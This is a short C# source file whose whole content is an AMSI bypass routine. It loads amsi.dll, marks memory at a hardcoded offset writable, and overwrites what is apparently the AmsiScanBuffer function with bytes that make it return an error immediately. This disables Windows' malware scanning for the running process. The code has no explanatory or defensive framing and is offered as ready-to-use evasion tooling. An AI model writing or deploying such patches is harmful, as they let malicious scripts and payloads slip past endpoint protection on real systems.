using System;
using System.Runtime.InteropServices;


public class Amsi
{
    static byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    public static void Bypass()
    {
        try
        {   
            var lib = Win32.LoadLibrary("amsi.dll");
            IntPtr ASBPtr = new IntPtr(lib.ToInt64() + 9536);
            uint oldProtect;
            Win32.VirtualProtect(ASBPtr, (UIntPtr)patch.Length, 0x04, out oldProtect);
            Marshal.Copy(patch, 0, ASBPtr, patch.Length);
            Win32.VirtualProtect(ASBPtr, (UIntPtr)patch.Length, 0x20, out oldProtect);  
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}
class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
